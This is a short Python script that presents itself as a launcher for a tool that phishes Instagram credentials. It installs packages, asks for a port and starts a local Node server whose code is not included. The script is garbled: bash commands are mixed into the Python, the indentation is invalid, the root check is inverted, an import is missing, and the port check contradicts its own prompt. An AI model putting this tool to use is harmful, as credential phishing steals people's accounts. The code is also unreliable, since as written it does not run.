#bash/bin/python3


from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup
import time
import requests
import os 
import sys

# This color
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'


def run_server():
    print("\033[92m checking if rooted.\033[0m")

def check_root():
    if os.geteuid() != 0:
        print("your rooted")
    else: print ("your not rooted")
        exit(1)

if __name__ == "__main__":
    check_root()

    # Continue with your script here
    

    print("\033[92mRUN TOR FOR ANONYMOUS\033[0m")
    time.sleep(2)
    then 
    clear 

    # Update packages and install dependencies
    os.system("apt update && apt upgrade")
    os.system("apt install php")
    os.system("apt install git")
    os.system("apt install curl")
    os.system("apt install python3")
    os.system("apt install ruby")
    os.system("apt install tor")
    os.system("apt install bash")
    os.system("apt install python3-pip")
    os.system("apt-get install xidel")
    os.system("apt-get install python3-selenium")

    print("\033[92mTERINSTALL\033[0m")
    time.sleep(1)
    then 
    clear 

    # Display info
    print("\033[92m\n\n")
    print("\033[92m ______                          _____        ______              _____        ______       _____                   ")
    print("\033[92m |     |     |       |     |     |            |     |     /\     |      \     |            |                        ")
    print("\033[92m |_____/     |       |     |     |____        |_____/    /  \    |       |    | ____       | ____                   ")
    print("\033[92m |     \     |       |     |     |            |     \   /____\   |       |    |      \     |                        ")
    print("\033[92m |_____|     |____   |_____|     |_____****** |_____|  /      \  |_____ /     |______|     |_____                   ")

    print("\033[92m\n\n")
    print("\033[92m         ***********************************************")
    print("\033[92m         #                                             #")
    print("\033[92m         #   tool For fishing IG credentials #")
    print("\033[92m         #   Follow Me On Github: @ephraim sib#")
    print("\033[92m         #   Contact Me In: ephraimsibale20@gmail.com#")
    print("\033[92m         #   Changelog: 5-12-2023           #")
    print("\033[92m         #                                             #")
    print("\033[92m         ***********************************************")
    print("\033[92m\n\n")

    # Prompt user to enter a port number
    port = input("Please enter a port number (1024 to 65535):")

    # Validate the entered port number
    while not re.match('^[1-9][0-9]{3}$', port):
        print("Invalid port number. Please enter a port number (1024 to 65535):")
        port = input()

    # Generate the link
    link = f"http://localhost:{port}/"

    # Print the link
    print(f"Generated link: {link}")

    # Set the file to write log messages to
    logfile = "server.log"

    # Set the file to run the server
    server_file = "server.js"

    # Set the command to run the server
    server_command = f"node {server_file}"

    # Print start message
    print(f"Starting server on port {port}")

    # Redirect stdout and stderr to log file
    sys.stdout = open(logfile, "a")
    sys.stderr = open(logfile, "a")

    # Run the server
    os.system(f"{server_command} {port}")


if __name__ == "__main__":
    run_server()
